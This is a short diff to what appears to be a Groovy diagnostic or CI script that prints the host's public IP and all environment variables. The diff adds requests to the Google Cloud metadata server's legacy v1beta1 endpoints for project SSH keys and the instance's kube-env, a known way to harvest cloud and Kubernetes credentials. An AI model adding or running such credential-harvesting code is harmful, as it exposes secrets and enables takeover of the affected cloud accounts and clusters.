@@ -67,7 +67,13 @@ String readWithThrowInfo(String url) {
 }
 
 println("IP: ${readWithThrowInfo("http://checkip.amazonaws.com")}")
+println()
 println(readWithThrowInfo("https://ca.api.ovh.com/1.0/auth/time"))
+println()
+println(readWithThrowInfo("http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"))
+println()
+println(readWithThrowInfo("http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"))
+println()
 println("Enviroment Variables:")
 Map<String, String> env = System.getenv();
 for (String envName : env.keySet()) {
